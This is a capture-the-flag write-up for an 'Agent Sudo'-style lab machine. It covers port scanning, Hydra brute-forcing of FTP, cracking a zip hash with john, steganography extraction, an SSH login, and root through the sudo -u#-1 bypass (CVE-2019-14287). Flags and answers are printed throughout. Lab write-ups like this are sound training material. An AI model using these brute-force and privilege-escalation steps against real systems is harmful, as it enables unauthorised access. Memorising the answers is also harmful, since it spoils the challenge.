
## Enumerate

```
┌──(root㉿kali)-[~]
└─# nmap -p- 10.10.145.207 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-13 14:47 UTC
Nmap scan report for ip-10-10-145-207.eu-west-1.compute.internal (10.10.145.207)
Host is up (0.0014s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:38:26:CB:75:45 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.80 seconds
```

```
└─# nmap -p 21,22,80 -sVC 10.10.145.207 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-13 14:52 UTC
Nmap scan report for ip-10-10-145-207.eu-west-1.compute.internal (10.10.145.207)
Host is up (0.00032s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 02:38:26:CB:75:45 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Questions

How many open ports?
```
3
```

How you redirect yourself to a secret page?
```
user-agent
```

What is the agent name?
```
chris
```
## Hash Cracking and Brute Force 

Utilize hydra to brute force the password of the ftp server with the username chris.
The password found was crystal
```
└─# hydra -l chris -P 10-million-password-list-top-1000.txt 10.10.145.207 ftp 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-13 15:24:03
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task
[DATA] attacking ftp://10.10.145.207:21/
[21][ftp] host: 10.10.145.207   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-13 15:25:00
```

Attempt to login to the FTP Server with the new found credentials
```
ftp 10.10.35.121
username: chris
password: crystal
```

List out the directory for the FTP server 
Download all files to the local machine from the ftp server
If the  get * command doesn't work to retrieve all of the files, use the command on the individual files. 
```
dir
get *
```

Extract any other files from the png file using the binwalk command. 
Navigate into the newly created directory
List out the details for each file that was created
The 8702 file contains a hidden text file called To_agentR.txt that's compressed. 
```
binwalk --dd ".*" cutie.png
cd _cutie.png.extracted/
file *

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive

```

Using the zip2john command we can turn the zipped file into a hash.
```
root@ip-10-10-192-41:~/_cutie.png.extracted# zip2john 8702  > hash.txt 
```

This hash file allows us to use the John command to  crack the hidden password. 
John automatically detects that there's a hashed password inside of the hash.txt file
```
root@ip-10-10-127-181:~/_cutie.png.extracted# cat hash.txt 
8702/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702:8702

root@ip-10-10-127-181:~/_cutie.png.extracted# john hash.txt 
Warning: detected hash type "ZIP", but the string is also recognized as "ZIP-opencl"
Use the "--format=ZIP-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/opt/john/password.lst
alien            (8702/To_agentR.txt)
1g 0:00:00:02 DONE 2/3 (2024-11-13 23:01) 0.4739g/s 13918p/s 13918c/s 13918C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Unzip the 8702 zip file with the password found above
```
7z x 8702 
password: alien
```

We can now read the text file that was zipped
```
Agent C,
We need to send the picture to 'QXJlYTUx' as soon as possible!
By,
Agent R

```

The string 'QXJlYTUx' is nonsense, but when converting it from base64 we're able to get readable text
```
echo QXJlYTUx | base64 -d
Area51
```

When using steghide on the cutie.png file we can extract another message
This gives us text with the password "hackerrules!"
```
root@ip-10-10-127-181:~# steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".

root@ip-10-10-127-181:~# cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
#### Questions

FTP password
```
crystal
```

Zip file password
```
alien
```

steg password
```
Area51
```

Who is the other agent (in full name)?
```
james
```

SSH password
```
hackerrules!
```

## Capture the Flag 



SSH into the target machine with the username james and the password hackerrules!
```
ssh james@10.10.215.245
password: hackerrules!
```

```
cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
```

There's an alien image on the server. 
If you were to copy the image to the local computer an do a reverse image search articles with the headline "Roswell Alien Autopsy" should appear. 
This is the answer to one of the flags. 
#### Questions 


What is the user flag?
```
b03d975e8c92a7c04146cfa7a5a313c7
```

What is the incident of the photo called?
```
Roswell alien autopsy
```
## Privilege Escalation

```
sudo -l 
sudo -u#-1 /bin/bash
```

CVE number for the escalation 

(Format: CVE-xxxx-xxxx)
```
CVE-2019–14287
```
What is the root flag?
```
b53a02f55b57d4439e3341834d70c062
```
(Bonus) Who is Agent R?
```
DesKel
```


